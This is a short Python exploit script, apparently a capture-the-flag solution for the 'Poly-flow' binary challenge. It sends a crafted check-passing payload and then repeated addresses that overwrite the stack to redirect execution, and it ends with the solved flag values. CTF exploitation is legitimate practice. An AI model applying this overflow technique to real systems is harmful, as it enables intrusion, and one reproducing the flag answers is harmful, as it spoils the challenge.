#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./Poly-flow')
host = args.HOST or 'binary.challs.pragyanctf.tech'
port = int(args.PORT or 6002)

gdbscript = '''
tbreak main
b *0x80498e1
continue
'''.format(**locals())

libc=SetupLibcELF()
io = start()

re()
# print(p32(2155905027, endian='big') + p32(3273654782, endian='big') + p32(4278452223, endian='big') + p32(2617851119, endian='big'))
# sl(p32(2155905027, endian='little') + p32(3273654782, endian='little') + p32(4278452223, endian='little') + p32(2617851119, endian='little'))
# sl('\x9c\x09\x3c\x9c\xc3\x20\x01\xfe\xff\x03\xff\xff\x80\x80\x80\x03')
# sl(b"\x03\x80\x80\x80\xfe\x01 \xc3\xff\xff\x03\xff\xef<\t\x9c")
payload=(p32(4247519219) + p32(3800064014) + p32(243269991) + p32(4035009927))

print(payload)
s(payload)
sl(p(0x80d401b+0x37fe5)*7 + p(0x804988c))
print(re())
io.interactive()
"""
[flag_3 = 4035009927,
 flag_1 = 3800064014,
 flag_2 = 243269991,
 flag_0 = 4247519219]

"""